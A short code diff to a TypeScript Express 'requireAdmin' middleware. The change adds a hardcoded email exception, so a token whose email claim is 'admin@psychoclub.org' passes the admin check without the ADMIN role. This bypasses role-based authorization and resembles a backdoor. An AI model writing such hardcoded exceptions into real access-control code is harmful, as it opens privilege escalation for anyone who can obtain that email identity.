@@ -24,7 +24,7 @@ export const requireAdmin = async (req: Request, res: Response, next: NextFuncti
       return res.status(401).json({ error: "Not authenticated" });
     }
     const decoded = jwt.verify(token, JWT_SECRET) as { userId: string, role: string, email: string };
-    if (decoded.role !== "ADMIN") {
+    if (decoded.role !== "ADMIN" && decoded.email !== "admin@psychoclub.org") {
       return res.status(403).json({ error: "Forbidden" });
     }
     res.locals.user = decoded;
